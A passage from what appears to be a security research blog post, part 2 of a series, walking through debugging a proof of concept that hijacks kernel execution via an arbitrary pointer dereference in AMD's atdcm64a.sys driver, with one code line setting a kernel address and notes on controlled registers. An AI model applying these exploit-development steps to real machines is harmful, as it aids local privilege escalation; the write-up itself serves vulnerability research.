![](https://hnsecurity.it/wp-content/uploads/2024/08/image-42-1.png)Setting a breakpoint

At this point we can recompile and launch our PoC and press enter (I’ve placed a

getchar()

`getchar()` in the code in order to view the output of the program):

![](https://hnsecurity.it/wp-content/uploads/2024/08/image-43-1.png)Output of the PoC

You will notice the breakpoint was hit in IDA Pro:

![](https://hnsecurity.it/wp-content/uploads/2024/08/image-44-1.png)Breakpoint hit in IDA PRO

At this point we can just

step into

`step into`/

step over

`step over`/

run to cursor

`run to cursor` (

f7

`f7`/

f8

`f8`/

f4

`f4`) until we reach the call to our arbitrary pointer inside _**IofCallDriver()**_. In my opinion, it may be really helpful to **debug the pseudocode along with the runtime values of variables**.

Here’s an example while debugging _callDriver()_:

![](https://hnsecurity.it/wp-content/uploads/2024/08/image-45-1.png)View of IDA Pro with pseudocode and variables

After stepping into the debugger we eventually reach a call to **\_guard\_dispatch\_icall** having in **rax** the value **0xdeadbeef**.

![](https://hnsecurity.it/wp-content/uploads/2024/08/image-46-1.png)\_guard\_dispatch\_icall()

If you keep stepping inside _\_guard\_dispatch\_icall()_ you will get a **bug check error** because 0xdeadbeef is not a valid kernel address.

Let’s try changing 0xdeadbeef with a **real kernel address**. In this case I took

nt!ZwFlushInstructionCache+0x14

`nt!ZwFlushInstructionCache+0x14`.

Plain text

Copy to clipboard

Open code in new window

EnlighterJS 3 Syntax Highlighter

\[...\]

\*((PDWORD64)pDriverFunction) = 0xFFFFF80025E14C04;

\[...\]

\[...\]
\*((PDWORD64)pDriverFunction) = 0xFFFFF80025E14C04;
\[...\]

```
[...]
*((PDWORD64)pDriverFunction) = 0xFFFFF80025E14C04;
[...]
```

If you relaunch the updated PoC you will see you can reach a

jmp rax

`jmp rax` inside _\_guard\_dispatch\_icall_ where **rax** **is our** **arbitrary function pointer**, as you can see in the following screenshot (I suggest to **remove the IDA Pro Pseudocode view** when you are in routines such as _\_guard\_dispatch\_icall_ as IDA Pro will complain about not been able to create the pseudocode).

![](https://hnsecurity.it/wp-content/uploads/2024/08/image-48-1.png)jmp rax inside \_guard\_disaptch\_icall()

It is important to **check what registers we control**. As we can see, we control **RBX**, **RCX** and **RDI** by cross-checking the address values printed by our program. In fact we may notice that

rbx

`rbx` corresponds to

object+0x30

`object+0x30`/

ptr

`ptr`, while

rcx

`rcx` and

rdi

`rdi` corresponds to

object2+0x30

`object2+0x30`.

At this point we know **we can redirect execution to an arbitrary address** and that we control registers **RBX**, **RCX** and **RDI**.

## Wrapping up

In this second part of the [series](https://hnsecurity.it/tag/atdcm64a/) we successfully confirmed both vulnerabilities by retrieving the base address of ntoskrnl.exe and hijacking the execution flow, annotating what the controlled registers are.

In the [next and final part](https://hnsecurity.it/blog/exploiting-amd-atdcm64a-sys-arbitrary-pointer-dereference-part-3/) we will finally **exploit the vulnerabilities** in order to achieve **Local Privilege Escalation**. Stay tuned!

[exploit development](https://hnsecurity.it/blog/tag/exploit-development/) [exploit](https://hnsecurity.it/blog/tag/exploit/) [ida](https://hnsecurity.it/blog/tag/ida/) [vulnerability research](https://hnsecurity.it/blog/tag/vulnerability-research/) [reverse engineering](https://hnsecurity.it/blog/tag/reverse-engineering/) [static analysis](https://hnsecurity.it/blog/tag/static-analysis/) [windows](https://hnsecurity.it/blog/tag/windows/) [Tutorial](https://hnsecurity.it/blog/tag/tutorial/) [red teaming](https://hnsecurity.it/blog/tag/red-teaming/) [atdcm64a](https://hnsecurity.it/blog/tag/atdcm64a/)

[![Groovy logo](https://hnsecurity.it/wp-content/uploads/2025/09/GROOVY.jpg)](https://hnsecurity.it/blog/groovy-template-engine-exploitation-part-2/?media_link=1)

[Exploits](https://hnsecurity.it/blog/category/exploits/)[Articles](https://hnsecurity.it/blog/category/articles/)

November 11, 2025

### [Groovy Template Engine Exploitation – Notes from a real case scenario, part 2](https://hnsecurity.it/blog/groovy-template-engine-exploitation-part-2/)

[![Microsoft 365 logo](https://hnsecurity.it/wp-content/uploads/2025/09/MIC-365.jpg)](https://hnsecurity.it/blog/export-to-pdf-allows-local-file-inclusion-path-traversal-in-microsoft-365/?media_link=1)

[Vulnerabilities](https://hnsecurity.it/blog/category/vulnerabilities/)

July 8, 2025

### [Export to PDF allows local file inclusion/path traversal in Microsoft 365](https://hnsecurity.it/blog/export-to-pdf-allows-local-file-inclusion-path-traversal-in-microsoft-365/)

[![ZeroDay logo](https://hnsecurity.it/wp-content/uploads/2025/09/ZERODAY.jpg)](https://hnsecurity.it/blog/my-zero-day-quest-bluehat-podcast/?media_link=1)

[Events](https://hnsecurity.it/blog/category/events/)[Vulnerabilities](https://hnsecurity.it/blog/category/vulnerabilities/)[Articles](https://hnsecurity.it/blog/category/articles/)

May 6, 2025

### [My Zero Day Quest & BlueHat Podcast](https://hnsecurity.it/blog/my-zero-day-quest-bluehat-podcast/)

[![Zyxel Networks logo](https://hnsecurity.it/wp-content/uploads/2025/09/ZYXEL.jpg)](https://hnsecurity.it/blog/local-privilege-escalation-on-zyxel-usg-flex-h-series-cve-2025-1731/?media_link=1)

[Exploits](https://hnsecurity.it/blog/category/exploits/)[Vulnerabilities](https://hnsecurity.it/blog/category/vulnerabilities/)

April 23, 2025

### [Local privilege escalation on Zyxel USG FLEX H Series (CVE-2025-1731)](https://hnsecurity.it/blog/local-privilege-escalation-on-zyxel-usg-flex-h-series-cve-2025-1731/)

[![Microsoft logo](https://hnsecurity.it/wp-content/uploads/2025/09/WIN.jpg)](https://hnsecurity.it/blog/cve-2024-49138-windows-clfs-heap-based-buffer-overflow-analysis-part-2/?media_link=1)

[Exploits](https://hnsecurity.it/blog/category/exploits/)[Vulnerabilities](https://hnsecurity.it/blog/category/vulnerabilities/)

January 29, 2025

### [CVE-2024-49138 Windows CLFS heap-based buffer overflow analysis – Part 2](https://hnsecurity.it/blog/cve-2024-49138-windows-clfs-heap-based-buffer-overflow-analysis-part-2/)

[![Microsoft logo](https://hnsecurity.it/wp-content/uploads/2025/09/WIN.jpg)](https://hnsecurity.it/blog/cve-2024-49138-windows-clfs-heap-based-buffer-overflow-analysis-part-1/?media_link=1)

[Exploits](https://hnsecurity.it/blog/category/exploits/)[Vulnerabilities](https://hnsecurity.it/blog/category/vulnerabilities/)

January 29, 2025

### [CVE-2024-49138 Windows CLFS heap-based buffer overflow analysis – Part 1](https://hnsecurity.it/blog/cve-2024-49138-windows-clfs-heap-based-buffer-overflow-analysis-part-1/)

[![](https://hnsecurity.it/wp-content/uploads/2025/09/AMD.jpg)](https://hnsecurity.it/blog/from-arbitrary-pointer-dereference-to-arbitrary-read-write-in-latest-windows-11/?media_link=1)

[Exploits](https://hnsecurity.it/blog/category/exploits/)[Vulnerabilities](https://hnsecurity.it/blog/category/vulnerabilities/)

January 15, 2025

### [From arbitrary pointer dereference to arbitrary read/write in latest Windows 11](https://hnsecurity.it/blog/from-arbitrary-pointer-dereference-to-arbitrary-read-write-in-latest-windows-11/)

[![KEYCLOAK logo](https://hnsecurity.it/wp-content/uploads/2025/09/KEYCLOAK.jpg)](https://hnsecurity.it/blog/an-analysis-of-the-keycloak-authentication-system/?media_link=1)

[Vulnerabilities](https://hnsecurity.it/blog/category/vulnerabilities/)[Articles](https://hnsecurity.it/blog/category/articles/)

October 30, 2024

### [An analysis of the Keycloak authentication system](https://hnsecurity.it/blog/an-analysis-of-the-keycloak-authentication-system/)

[![](https://hnsecurity.it/wp-content/uploads/2025/09/AMD.jpg)](https://hnsecurity.it/blog/exploiting-amd-atdcm64a-sys-arbitrary-pointer-dereference-part-3/?media_link=1)

[Exploits](https://hnsecurity.it/blog/category/exploits/)[Vulnerabilities](https://hnsecurity.it/blog/category/vulnerabilities/)

October 9, 2024

### [Exploiting AMD atdcm64a.sys arbitrary pointer dereference – Part 3](https://hnsecurity.it/blog/exploiting-amd-atdcm64a-sys-arbitrary-pointer-dereference-part-3/)

[Scroll to top](https://hnsecurity.it/blog/exploiting-amd-atdcm64a-sys-arbitrary-pointer-dereference-part-2/#)

We use cookies to improve your browsing experience and analyze our traffic. By clicking "Accept all", you consent to the use of cookies.Accept AllPrivacy policy